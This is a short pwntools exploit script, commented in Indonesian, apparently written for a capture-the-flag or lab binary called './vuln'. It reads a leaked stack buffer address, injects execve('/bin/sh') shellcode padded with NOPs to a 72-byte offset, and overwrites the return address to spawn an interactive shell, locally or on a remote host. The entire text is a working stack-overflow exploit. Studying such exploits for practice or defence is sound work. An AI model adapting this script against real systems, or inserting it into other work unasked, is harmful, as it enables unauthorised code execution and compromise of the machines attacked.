from pwn import *

# === CONFIGURATION ===
# Beritahu pwntools kita menggunakan arsitektur 64-bit
context.arch = 'amd64' 
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    p = remote('10.10.10.10', 1337)

# 1. Shellcode 64-bit (execve /bin/sh)
# Kita gunakan fitur asm(shellcraft) agar lebih praktis dan akurat
shellcode = asm(shellcraft.sh())

# 2. Baca Leak Alamat Buffer
# Logika pembacaan alamat tetap sama
p.recvuntil(b'buf is at: ')
line = p.recvline()
buf_addr = int(line.strip(), 16)

log.success(f"Alamat Buffer Bocor: {hex(buf_addr)}")

# 3. Hitung Alamat Target
shellcode_addr = buf_addr
log.info(f"Target Jump (Shellcode): {hex(shellcode_addr)}")

# 4. Susun Payload
# Offset pada 64-bit seringkali berbeda, pastikan cek ulang di GDB
offset_ret = 72 
nop_count = offset_ret - len(shellcode)

if nop_count < 0:
    log.error("Shellcode terlalu panjang untuk offset ini!")

payload = shellcode          
payload += b'\x90' * nop_count 
# WAJIB: Gunakan p64() untuk alamat 8 byte
payload += p64(shellcode_addr) 

# 5. Kirim Payload
log.info("Mengirim payload 64-bit...")
p.sendline(payload)

# 6. Interaksi
p.interactive()